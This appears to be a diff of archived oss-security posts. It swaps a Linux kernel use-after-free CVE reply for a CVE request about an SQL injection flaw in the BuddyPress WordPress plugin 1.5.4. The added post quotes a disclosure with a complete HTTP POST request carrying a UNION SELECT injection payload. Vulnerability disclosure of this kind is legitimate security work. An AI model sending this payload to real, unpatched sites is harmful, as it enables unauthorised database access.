@@ -1,37 +1,40 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/08/21/4
-Message-ID: <503384E3.8010903@mvista.com>
-Date: Tue, 21 Aug 2012 05:53:55 -0700
-From: akuster <akuster@...sta.com>
-To: Petr Matousek <pmatouse@...hat.com>
-CC: oss-security@...ts.openwall.com
-Subject: Re: CVE Request -- kernel: taskstats: use-after-free in xacct_add_tsk()
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/04/15/2
+Message-ID: <20120415090537.GA25137@kludge.henri.nerv.fi>
+Date: Sun, 15 Apr 2012 12:05:37 +0300
+From: Henri Salo <henri@...v.fi>
+To: oss-security@...ts.openwall.com
+Subject: CVE-request: WordPress BuddyPress-plugin SQL-injection 1.5.4
 Content-Type: text/plain; charset=utf-8
 
-Petr,
+Hello,
 
-If I am not mistaken, this was introduced via
-9acc1853519a0473620d424105f9d49ea5b4e62e and only if TASK_XACCT is enabled.
+Can I get 2012 CVE-identifier for WordPress BuddyPress-plugin SQL-injection.
 
-is that correct?
+Affected: 1.5.4
+Fixed: 1.5.5
+Vendor: http://buddypress.org/2012/03/buddypress-1-5-5/
+OSVDB: http://osvdb.org/show/osvdb/80763
+Changelog: http://codex.buddypress.org/releases/version-1-5/ (doesn't seem to say about this issue)
 
-regards,
-Armin
+http://seclists.org/bugtraq/2012/Apr/4
+"""
+Hi,
 
+I would like disclosure SQL injection vulnerability if Buddypress plugin affecting last versions. This issue was 
+reported to developers and resolved in 1.5.5 version. So, I suggest all having this plugin in their blogs update to 
+last version, if you haven't done it yet. Example of POST message with sql injection is below.
 
-On 08/20/2012 10:25 AM, Petr Matousek wrote:
-> An use-after-free flaw has been found in the way taskstat's
-> TASKSTATS_CMD_ATTR_PID command and exiting tasks with already freed mm
-> interacted. An unprivileged local user could use this flaw to crash the
-> system or leak kernel memory.
-> 
-> Please note that the fix below is from year 2006.
-> 
-> Upstream fix:
-> http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commitdiff;h=f0ec1aaf54caddd21c259aea8b2ecfbde4ee4fb9
-> 
-> References:
-> http://bugzilla.openvz.org/show_bug.cgi?id=2294
-> https://bugzilla.redhat.com/show_bug.cgi?id=849722
-> 
-> Thanks,
+POST /wp-load.php HTTP/1.1
+User-Agent: Mozilla
+Host: example.com
+Accept: */*
+Referer: http://example.com/activity/?s=b
+Connection: Keep-Alive
+Content-Length: 153
+Content-Type: application/x-www-form-urlencoded
+
+action=activity_widget_filter&page=1%26exclude%3d1)and(1=0)UNION(SELECT(1),(2),(3),(4),(5),(6),(7),(8),(9),(10),(11),(12),(13),(14),(15),(16),(17))%3b--+
+"""
+
+- Henri Salo
